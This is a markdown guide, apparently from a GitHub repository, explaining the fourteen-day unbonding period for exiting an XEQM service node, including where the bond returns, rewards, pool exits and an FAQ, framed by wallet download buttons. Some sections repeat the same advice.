![XEQM WALLET](assets/banner-article.png)

# XEQM unbonding period after unstaking

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

A voluntary XEQM service-node exit carries a fourteen-day unbonding period. The stake is not spendable during it, and at the end the bond returns to the wallet that committed it. Plan the exit as deliberately as the entry, because the money is committed for a fortnight after you decide to stop.

## What unbonding is for

The bond exists so that a node has something at stake while it is trusted to validate and relay. A bond that could be withdrawn the moment an operator decided to leave would not serve that purpose during the notice period.

Unbonding is the notice period. It keeps the stake committed while the network stops counting the node and while any pending obligations settle.

## The timeline

You announce the exit, the node leaves the active set, and the stake sits locked for fourteen days before it returns to the originating wallet.

Nothing about that requires you to keep the machine running. The node has stopped; the wait is about the bond rather than the server.

## Where the stake goes back to

The wallet that committed it. Not a different wallet, not a new address you supply at exit time  -  the originating wallet.

That is worth checking before you register rather than after. If the wallet holding the bond is one you intend to retire, the exit lands in a wallet you no longer use.

## What happens to rewards

They stop when the node leaves the active set. The unbonding period is not a period of earning; it is a period of waiting.

Any rewards already earned stay where they were distributed. Unbonding concerns the bond, not the income.

## The bond is not a savings account

A savings balance is available when you ask. A bond is available after a notice period, and the notice is the product rather than a delay in it.

Treating the two as the same thing is how operators end up short of money they thought they had. Keep the bond and the spending balance separate, in separate wallets if that helps you remember. [How much XEQM runs a service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-much-xeqm-to-run-a-service-node.md) covers the size of the commitment.

A short unbonding period would let an operator leave at the first sign of trouble, which is precisely when a validator is most useful. Fourteen days is long enough to be a commitment and short enough to be tolerable.

The same logic explains why deregistration for missed uptime also returns the stake: the network is not punishing the principal, it is removing a node that was not doing the job.

## Unbonding is not the same as deregistration

A voluntary exit is a decision. A deregistration is an outcome. Both return the bond, and they are triggered by different things.

A node removed for missing windows does not serve a notice period in the same sense: it has already stopped being counted. [Why an XEQM node gets deregistered](https://github.com/XEQMFoundation/account-guide/blob/main/why-was-my-xeqm-node-deregistered.md) covers the causes.

## Planning around the fourteen days

If the coins might be needed inside a fortnight, they should not be in a bond. That is the whole of the practical advice, and it is easier to follow before registration than after.

Keep a separate balance for spending. The bond is infrastructure capital, and treating it as a wallet balance is how people end up needing money they have locked. [How much XEQM runs a service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-much-xeqm-to-run-a-service-node.md) covers the amounts.

## What a pool contributor should ask

Whose wallet holds the bond, what the operator's exit process is, and how a contributor's share is returned when the node winds down. The fourteen days apply to the stake, and the pool's terms decide what happens to your part of it.

A pool that cannot describe its exit is a pool that has not thought about the end. [Staking XEQM with less than 200K](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-stake-xeqm-with-less.md) covers the arrangement.

## What the wallet shows during the wait

The stake appears as committed rather than spendable, and the wallet's service-node view reflects that the node has left the active set. There is no screen to press and nothing to claim.

If the wallet is closed for the fortnight, nothing is lost. The state lives on the chain, and reopening the wallet shows the same position.

## Exiting a pool versus exiting a node

An operator exits by deregistering the node and waiting out the period. A contributor exits by the pool's process, which ends with the operator returning their share after the bond comes back.

Those are different clocks. A contributor should know before joining which one they are on and who controls the second. [Staking XEQM with less than 200K](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-stake-xeqm-with-less.md) covers the arrangement.

## Timing an exit around a price

Operators sometimes want to exit because the price moved. The fourteen days make that a slow decision, and the price can move again before the coins are spendable.

That is an argument for deciding on the basis of the operation rather than the market: exit when the machine or the commitment no longer suits you, not when a chart does.

## During the wait

Nothing needs to be done. The wallet shows the stake as committed rather than spendable, and the machine can be repurposed, reinstalled or shut down.

If you are exiting because of a hardware problem, this is the window to rebuild the machine. If you are exiting to sell, the coins are not yours to send until the period ends.

## What the wait protects you from

A run on the bond. If every operator could withdraw at once, a network under stress would lose its validators precisely when it needed them, and the stake would stop meaning anything.

Fourteen days spreads that out and gives the network time to adjust. It is a stability mechanism rather than a punishment.

## After the bond returns

The coins are ordinary spendable XEQM again, in a wallet you already hold the seed for. There is no separate claim to redeem and no second step.

That is the one genuinely simple part of staking: the exit is a wait, then a balance. [What XEQM staking pays](https://github.com/XEQMFoundation/account-guide/blob/main/what-apy-does-xeqm-staking-pay.md) covers why the income during the stake was never a fixed rate.

## What the exit does to your records

Keep the registration and the exit together with the wallet's own history. The bond is a large balance that left and came back, and the pair of transactions is what explains the gap if anybody asks.

That record also tells you when the period started, which is the one date that matters while you wait.

## What to do if the stake has not arrived

Wait out the period before concluding anything. A bond that has not returned on the day you expected is usually a period that started later than you think, because the clock begins with the exit rather than with the decision.

The wallet's service-node view and the chain itself are the references. If the period has clearly passed and nothing returned, that is a support question with a transaction identifier attached, not a reason to restore anything.

## The summary

Fourteen days, stake back to the originating wallet, rewards stop when the node leaves. Plan for the wait before you register, keep a separate balance for spending, and do not treat the bond as liquid.

If that sounds restrictive, it is meant to. [How to set up an XEQM service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-set-up-an-xeqm-service-node.md) covers everything that comes before.

## Frequently asked questions

### How long is the unbonding period?

Fourteen days for a voluntary service-node exit.

### Can I spend the stake during unbonding?

No. It is committed until the period ends.

### Do I have to keep the node online while unbonding?

No. The node has left the active set; the wait concerns the bond.

### Is the stake slashed on exit?

No slashing of the principal is stated by current sources. The bond returns to the originating wallet.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [How much XEQM runs a service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-much-xeqm-to-run-a-service-node.md)
- [Staking XEQM with less than 200K](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-stake-xeqm-with-less.md)
- [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md)
